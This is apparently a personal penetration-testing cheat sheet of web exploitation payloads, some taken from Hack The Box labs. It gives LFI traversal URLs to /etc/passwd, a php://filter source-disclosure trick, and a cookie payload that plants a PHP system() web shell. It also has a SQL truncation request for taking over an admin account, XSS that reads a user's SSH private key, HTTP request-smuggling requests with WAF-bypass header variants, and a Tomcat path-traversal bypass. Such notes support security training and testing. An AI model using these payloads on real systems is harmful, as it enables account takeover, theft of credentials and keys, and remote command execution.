# Exploitation Techniques

### LFI
#### Displaying the contents of files

```
http://<url>?attr=../../../../../../../../../etc/passwd
```

#### Finding hidden information in encoded format

```
http://<url>?page=php://filter/convert.base64-encode/resource=index
```

#### If a cookie is vulnerable

- Vulnerable PHP code
```php
<?php 
if (isset($_COOKIE["lang"]))
{
    include("lang/".$_COOKIE['lang']);
}
?>
```

- Change "Cookie" in request headers while sending the request to get web shell
```
Cookie: lang?=<?php echo system($_GET["cmd"]);?>
```

#### SQL Truncation attack

- if the website has some limit on username or email fields

```javascript
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
```

- so this script shows us that the input in the fields should be limited to a set number of characters. 
- If we create an account with a name like "admin        hello", the script will truncate all characters after the 10th character, and our name will become admin
- For this the form must allow entering spaces

- the webpage seems to perform a client side email validation, to bypass that, we craft our request using burp

```
POST /index.php HTTP/1.1
Host: book.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://book.htb/index.php
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 61

name=admin+++++a&email=admin%40book.htb++++++a&password=hello
```

#### XSS attack for LFI if some files are dynamically generated

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

- We can use this method to find other interesting files, like id_rsa
```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```


## Request Splitting Attack 

- Content-Length determines the length of the request body (including the newline and spaces)
- Transfer-Encoding: chunked 
```
Transfer-Encoding: chunked

b
q=smuggling
0 # anything after 0 will be considered as a new request, 0 is the terminating character
```

#### Ways to exploit this: 

1. CL:CL 
	
	- **Original request** 
	```
	Get /HTTP/1.1
	Content-Length: 45 
	Host: cyber.com
	
	Get /reqsmuggle HTTP/1.1 
	Host: cyber.com
	```
	- due to the mismatch in backend and frontend requests... it will consider the second part as a different request and will send two responses
	- **Backend response**
	```
	HTTP/1.1 200 OK
	Content-Length: 11
	
	hello worldHTTP/1.1 404 Not Found
	Connection: Close 
	Content-Length: 0
	```

2. CL:TE 

- Usually the Transfer-Encoding is supposed to override the Content-Length, but if that's not the case due to some vulnerability and it prioritizes Content-Length

	```
	POST /login HTTP/1.1
	Host: cyber.com
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 62
	Transfer-Encoding: chunked 
	
	16 									# all this is considered as request body
	login=xxx&password=xxx				# but the chunked transfer-encoding tells
	0									# tells the backend server that these are
	GET /404 HTTP/1.1 					# are separate requests
	X-Foo: bar
	```

- **Bypassing Transfer-Encoding** (Sometimes it is blacklisted by WAF)
	- Transfer-Encoding: xchunked 
	- Transfer-Encoding : chunked
	- Transfer-Encoding: chunked
	- Transfer-Encoding: x 
	- Transfer-Encoding: [tab]chunked
	- [space]Transfer-Encoding: chunked
	- X:X[\n]Transfer-Encoding: chunked
	- Transfer-Encoding
	: chunked
	
3. TE:CL

**Front-end**
- TE > CL
- So the front-end will simply consider anything within 8 and 0 upto 8 characters as the request body
```
POST / HTTP/1.1
Host: cyber.com
Content-Length: 3
Transfer-Encoding: chunked

8 
SMUGGLED
0
```

**Back-end **
- CL > TE 
It will consider `SMUGGLED` as a new request

#### Prevention 
- Prioritize transfer encoding over content-length in both front-end back-end 
- Disallow requests with both content-length and transfer-encoding and double content-length headers 
- Disallow malformed Transfer-Encoding headers and correct Processing of Multiple TE Values 
- Configure WAF to detect and block ambiguous requests
- Use the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests

## Tomcat
#### Directory Traversal 
- if /manager/html is blocked (401 Unauthorized) then try /manager/status/..;/html (/manager/status is accessible)
- send POST requests similarly